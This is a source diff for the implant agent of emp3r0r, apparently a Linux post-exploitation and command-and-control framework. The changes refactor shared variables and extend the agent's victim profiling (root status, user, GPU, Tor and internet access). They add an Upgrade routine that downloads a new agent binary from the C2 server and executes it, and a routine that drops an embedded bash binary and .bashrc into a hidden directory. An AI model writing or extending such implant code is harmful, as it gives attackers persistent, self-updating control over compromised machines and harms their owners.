@@ -1,3 +1,6 @@
+//go:build linux
+// +build linux
+
 package agent
 
 import (
@@ -5,24 +8,27 @@ import (
 	"errors"
 	"fmt"
 	"io"
+	"io/ioutil"
 	"log"
 	"net"
 	"os"
+	"os/exec"
 	"os/user"
 	"runtime"
 	"strconv"
+	"strings"
 	"time"
 
+	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
-	"github.com/zcalusic/sysinfo"
 )
 
 // is the agent alive?
-// connect to SocketName, send a message, see if we get a reply
+// connect to emp3r0r_data.SocketName, send a message, see if we get a reply
 func IsAgentAlive() bool {
 	log.Println("Testing if agent is alive...")
-	c, err := net.Dial("unix", SocketName)
+	c, err := net.Dial("unix", emp3r0r_data.SocketName)
 	if err != nil {
 		log.Printf("Seems dead: %v", err)
 		return false
@@ -46,12 +52,12 @@ func IsAgentAlive() bool {
 
 	// send hello to agent
 	for {
-		_, err := c.Write([]byte("emp3r0r"))
+		_, err := c.Write([]byte(fmt.Sprintf("hello from %d", os.Getpid())))
 		if err != nil {
 			log.Print("write error:", err)
 			break
 		}
-		if <-replyFromAgent == "emp3r0r" {
+		if strings.Contains(<-replyFromAgent, "emp3r0r") {
 			log.Println("Yes it's alive")
 			return true
 		}
@@ -62,8 +68,8 @@ func IsAgentAlive() bool {
 }
 
 // Send2CC send TunData to CC
-func Send2CC(data *MsgTunData) error {
-	var out = json.NewEncoder(H2Json)
+func Send2CC(data *emp3r0r_data.MsgTunData) error {
+	var out = json.NewEncoder(emp3r0r_data.H2Json)
 
 	err := out.Encode(data)
 	if err != nil {
@@ -73,29 +79,28 @@ func Send2CC(data *MsgTunData) error {
 }
 
 // CollectSystemInfo build system info object
-func CollectSystemInfo() *SystemInfo {
-	var (
-		si   sysinfo.SysInfo
-		info SystemInfo
-	)
-	si.GetSysInfo() // read sysinfo
+func CollectSystemInfo() *emp3r0r_data.SystemInfo {
+	var info emp3r0r_data.SystemInfo
+	osinfo := GetOSInfo()
 
-	info.OS = fmt.Sprintf("%s %s", si.OS.Name, si.OS.Version)
+	info.OS = fmt.Sprintf("%s %s (%s)", osinfo.Name, osinfo.Version, osinfo.Architecture)
 	hostname, err := os.Hostname()
 	if err != nil {
 		log.Printf("Gethostname: %v", err)
 		hostname = "unknown_host"
 	}
-	Tag = util.GetHostID()
-	info.Tag = Tag // use hostid
+	emp3r0r_data.AgentTag = util.GetHostID(emp3r0r_data.AgentUUID)
+	info.Tag = emp3r0r_data.AgentTag // use hostid
 	info.Hostname = hostname
-	info.Kernel = si.Kernel.Release
+	info.Version = emp3r0r_data.Version
+	info.Kernel = util.GetKernelVersion()
 	info.Arch = runtime.GOARCH
 	info.CPU = util.GetCPUInfo()
+	info.GPU = util.GetGPUInfo()
 	info.Mem = fmt.Sprintf("%d MB", util.GetMemSize())
 	info.Hardware = util.CheckProduct()
 	info.Container = CheckContainer()
-	info.Transport = Transport
+	info.Transport = emp3r0r_data.Transport
 
 	// have root?
 	info.HasRoot = os.Geteuid() == 0
@@ -112,7 +117,7 @@ func CollectSystemInfo() *SystemInfo {
 	info.User = fmt.Sprintf("%s (%s), uid=%s, gid=%s", u.Username, u.HomeDir, u.Uid, u.Gid)
 
 	// is cc on tor?
-	info.HasTor = tun.IsTor(CCAddress)
+	info.HasTor = tun.IsTor(emp3r0r_data.CCAddress)
 
 	// has internet?
 	info.HasInternet = tun.HasInternetAccess()
@@ -126,14 +131,55 @@ func CollectSystemInfo() *SystemInfo {
 	return &info
 }
 
-func calculateReverseProxyPort() string {
-	p, err := strconv.Atoi(ProxyPort)
+func Upgrade(checksum string) error {
+	tempfile := emp3r0r_data.AgentRoot + "/" + util.RandStr(util.RandInt(5, 15))
+	_, err := DownloadViaCC(emp3r0r_data.CCAddress+"www/agent", tempfile)
 	if err != nil {
-		log.Printf("WTF? ProxyPort %s: %v", ProxyPort, err)
+		return fmt.Errorf("Download agent: %v", err)
+	}
+	download_checksum := tun.SHA256SumFile(tempfile)
+	if checksum != download_checksum {
+		return fmt.Errorf("checksum mismatch: %s expected, got %s", checksum, download_checksum)
+	}
+	err = os.Chmod(tempfile, 0755)
+	if err != nil {
+		return fmt.Errorf("chmod %s: %v", tempfile, err)
+	}
+	return exec.Command(tempfile, "-replace").Start()
+}
+
+func calculateReverseProxyPort() string {
+	p, err := strconv.Atoi(emp3r0r_data.ProxyPort)
+	if err != nil {
+		log.Printf("WTF? emp3r0r_data.ProxyPort %s: %v", emp3r0r_data.ProxyPort, err)
 		return "22222"
 	}
 
 	// reverseProxyPort
 	rProxyPortInt := p + 1
 	return strconv.Itoa(rProxyPortInt)
+}
+
+func ExtractBash() error {
+	if !util.IsFileExist(emp3r0r_data.UtilsPath) {
+		err := os.MkdirAll(emp3r0r_data.UtilsPath, 0700)
+		if err != nil {
+			log.Fatalf("[-] Cannot mkdir %s: %v", emp3r0r_data.AgentRoot, err)
+		}
+	}
+
+	bashData := tun.Base64Decode(emp3r0r_data.BashBinary)
+	if bashData == nil {
+		log.Printf("bash binary decode failed")
+	}
+	checksum := tun.SHA256SumRaw(bashData)
+	if checksum != emp3r0r_data.BashChecksum {
+		return fmt.Errorf("bash checksum error")
+	}
+	err := ioutil.WriteFile(emp3r0r_data.UtilsPath+"/.bashrc", []byte(emp3r0r_data.BashRC), 0600)
+	if err != nil {
+		log.Printf("Write bashrc: %v", err)
+	}
+
+	return ioutil.WriteFile(emp3r0r_data.UtilsPath+"/bash", bashData, 0755)
 }
